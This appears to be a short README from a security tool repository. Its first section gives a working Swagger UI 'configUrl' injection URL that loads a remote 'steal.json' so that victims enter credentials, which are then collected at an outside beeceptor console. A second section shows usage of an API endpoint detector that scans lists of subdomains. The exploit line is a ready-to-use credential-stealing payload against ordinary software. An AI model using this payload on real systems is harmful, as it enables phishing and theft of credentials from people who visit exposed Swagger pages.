### Issue: Credentials Stealing: Injection Vulnerability on a Swagger Endpoint

Site:
```bash
site.com/swagger-ui.html
```
Exploit:
```bash
site.com/swagger-ui.html?configUrl=https://raw.githubusercontent.com/sahil3276/swagger/refs/heads/main/steal.json
```

PUT your credentials there.
then go to: https://app.beeceptor.com/console/sahil3276 and look for interactions

---------------------------------------------------------------------------------
### Api Endpoint Detect
```bash
pip install -r api_detector_requirements.txt
```
```bash
python apidetector.py -i list_subdomains.txt -o results_file.txt -t 30 -ua "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
```

- To scan with both HTTP and HTTPS protocols:
  ``` bash
  python apidetector.py -m -d example.com
  ```
